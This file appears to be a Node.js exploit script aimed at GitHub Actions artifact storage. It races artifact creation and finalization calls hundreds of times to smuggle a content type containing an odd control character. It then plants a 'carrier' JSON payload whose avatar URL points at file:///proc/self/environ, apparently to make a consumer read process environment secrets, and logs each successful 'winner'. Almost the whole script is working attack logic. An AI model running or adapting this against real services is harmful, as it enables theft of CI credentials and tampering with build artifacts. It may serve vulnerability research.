import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"finalize-race"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const winners = [];

async function create(name, version, mimeType) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, version, mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 180)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette finalize race carrier',
    stargazers_count: 0,
  }));
}

const profiles = [
  {first: 6, secondDelay: 0, finalDelay: 0},
  {first: 6, secondDelay: 0, finalDelay: 1},
  {first: 6, secondDelay: 1, finalDelay: 0},
  {first: 6, secondDelay: 0, finalDelay: 5},
  {first: 6, secondDelay: 5, finalDelay: 0},
  {first: 6, secondDelay: 0, finalDelay: 20},
  {first: 6, secondDelay: 20, finalDelay: 0},
  {first: 7, secondDelay: 0, finalDelay: 0},
  {first: 7, secondDelay: 0, finalDelay: 1},
  {first: 7, secondDelay: 1, finalDelay: 0},
  {first: 7, secondDelay: 0, finalDelay: 5},
  {first: 7, secondDelay: 5, finalDelay: 0},
  {first: 7, secondDelay: 0, finalDelay: 20},
  {first: 7, secondDelay: 20, finalDelay: 0},
];

async function prepare(index) {
  const profile = profiles[index % profiles.length];
  const name = `finalrace-${process.env.GITHUB_RUN_ID}-${index}`;
  const firstMime = profile.first === 6 ? odd : 'application/json';
  const first = await create(name, profile.first, firstMime);
  await upload(first.url, placeholder).catch(() => false);
  return {index, name, profile, first};
}

async function race(entry) {
  const {index, name, profile, first} = entry;
  const secondVersion = profile.first === 6 ? 7 : 6;
  const secondMime = secondVersion === 6 ? odd : 'application/json';
  const secondPromise = (async () => {
    if (profile.secondDelay) await sleep(profile.secondDelay);
    return create(name, secondVersion, secondMime);
  })();
  const finalPromise = (async () => {
    if (profile.finalDelay) await sleep(profile.finalDelay);
    return finalize(name);
  })();
  const [second, final] = await Promise.all([secondPromise, finalPromise]);
  await upload(second.url, placeholder).catch(() => false);
  const view = await inspect(name);
  const isOdd = view.contentType?.includes('\u0085') ?? false;
  const row = {
    index,
    profile,
    first: first.ok ? {ok: true} : first,
    second: second.ok ? {ok: true} : second,
    final,
    view: view.ok ? {
      ok: true,
      contentType: JSON.stringify(view.contentType).slice(1, -1),
    } : view,
    isOdd,
  };
  if (isOdd && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    const placed = await Promise.all(
      [first.url, second.url].map(url => upload(url, carrierBytes(repository)).catch(() => false)),
    );
    row.repository = repository;
    row.carrierPlaced = placed.some(Boolean);
    if (row.carrierPlaced) winners.push({id: final.id, name, repository});
  }
  console.log(`FINALRACE ${JSON.stringify(row)}`);
  return row;
}

const rows = [];
for (let start = 0; start < 280; start += 28) {
  const prepared = await Promise.all(
    Array.from({length: 28}, (_, offset) => prepare(start + offset)),
  );
  rows.push(...await Promise.all(prepared.map(race)));
}
const summary = {
  total: rows.length,
  odd: rows.filter(row => row.isOdd).length,
  finalized: rows.filter(row => row.final?.ok).length,
  secondCreated: rows.filter(row => row.second?.ok).length,
};
console.log(`FINALRACE_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners,
  summary,
  rows,
}, null, 2) + '\n');
